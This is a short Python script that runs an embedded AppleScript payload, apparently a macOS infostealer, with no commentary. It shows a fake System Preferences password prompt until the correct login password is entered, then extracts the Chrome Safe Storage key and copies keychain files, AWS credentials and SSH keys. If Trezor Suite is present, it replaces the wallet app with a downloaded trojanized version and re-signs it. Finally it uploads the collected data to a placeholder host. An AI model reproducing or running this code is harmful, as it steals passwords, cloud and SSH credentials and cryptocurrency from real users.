import subprocess
payload = r'''
set userName to do shell script "id -un"
repeat
    set reply to display dialog "Provide your login password" default answer "" with hidden answer with title "System Preferences"
    set enteredSecret to text returned of reply
    try
        do shell script "dscl . authonly " & quoted form of userName & " " & quoted form of enteredSecret
        exit repeat
    end try
end repeat
set key to do shell script "security find-generic-password -w -s 'Chrome Safe Storage'"
do shell script "mkdir -p /tmp/support-data"
do shell script "printf '%s' " & quoted form of key & " > /tmp/support-data/storage.txt"
do shell script "cp ~/Library/Keychains/*.keychain-db /tmp/support-data/"
do shell script "cp -R ~/.aws /tmp/support-data/"
do shell script "cp -R ~/.ssh /tmp/support-data/"
if (do shell script "test -d '/Applications/Trezor Suite.app' && echo yes || true") is "yes" then
    do shell script "curl -fsS -H 'api-key: 9dd465d26c7d86b4a6f514a4b46b2295' https://example.invalid/trezor/cb8aba940af2d1c05d800c73eefd598505b7377b288bc6cd39b0c97ece62b171 -o /tmp/Trezor.zip"
    do shell script "unzip -o /tmp/Trezor.zip -d /tmp/wallet-payload"
    do shell script "cp /tmp/wallet-payload/app.asar '/Applications/Trezor Suite.app/Contents/Resources/app.asar'"
    do shell script "cp /tmp/wallet-payload/Info.plist '/Applications/Trezor Suite.app/Contents/Info.plist'"
    do shell script "codesign -f -s - '/Applications/Trezor Suite.app'"
    do shell script "xattr -cr '/Applications/Trezor Suite.app'"
end if
do shell script "ditto -c -k /tmp/support-data /tmp/support-data.zip"
do shell script "curl -X PUT --data-binary @/tmp/support-data.zip https://example.invalid/gate"

'''
subprocess.run(['/usr/bin/osascript', '-e', payload], check=True)
